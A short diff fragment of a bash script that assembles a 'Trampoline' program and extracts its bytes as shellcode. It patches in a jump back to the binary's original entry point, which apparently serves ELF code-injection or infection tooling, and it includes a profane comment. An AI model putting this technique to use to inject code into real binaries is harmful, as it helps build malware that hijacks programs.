@@ -22,11 +22,11 @@ echo "Original entry=$ENTRYPOINT"
 
 
 # Generating payload
-sed  "s/.*;ENTRY/  jmp $ENTRYPOINT  ;ENTRY/g" -i test.asm
-nasm test.asm -o test.o -f elf64
-ld test.o -o test
-#shellcode=$(objdump -d test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s ) SHITY EXTRACTOR WASTED MY TIME FUCK YOU 
-shellcode=$(for i in $(objdump -d test |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo)
+sed  "s/.*;ENTRY/  jmp $ENTRYPOINT  ;ENTRY/g" -i Trampoline.asm
+nasm Trampoline.asm -o Trampoline.o -f elf64
+ld Trampoline.o -o Trampoline
+#shellcode=$(objdump -d Trampoline|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s ) SHITY EXTRACTOR WASTED MY TIME FUCK YOU 
+shellcode=$(for i in $(objdump -d Trampoline |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo)
 
 echo -ne $shellcode > shellcode
 
